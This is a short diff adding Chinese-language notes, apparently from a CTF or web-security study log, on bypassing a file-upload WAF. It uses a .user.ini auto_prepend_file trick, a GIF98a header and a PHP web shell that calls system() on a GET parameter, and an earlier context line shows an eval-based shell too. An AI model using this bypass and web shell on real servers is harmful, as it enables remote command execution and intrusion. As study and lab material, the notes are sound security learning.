@@ -512,3 +512,24 @@ auto_prepend_file= .user.ini
 #<?php @eval('$_POST["cmd"]');>  
 ```
 auto_prepend_file后面一定不要加空格.......
+
+
+文件上传，waf有：
+1. 不允许文件名内容含`<?`
+2. 不允许文件后缀为`php
+3. 检查文件头
+
+文件名检查我们可以想到用配置文件绕过
+文件内容我们用其他php标签绕过` <script language='php'></script>`
+文件头只要加一个`GIF98a`
+
+上传：
+```ini
+GIF98a
+auto_prepend_file = .user.ini
+#<script language='php'>system($_GET['cmd']);</script>
+```
+执行php文件前包含本身，然后通过注释写入php代码，这样就可以直接执行了
+
+注意，这里能用.user.ini的原因是上传目录中存在index.php文件，如果不存在那也不会自动包含
+![](assets/Day%204/file-20251222045818220.png)
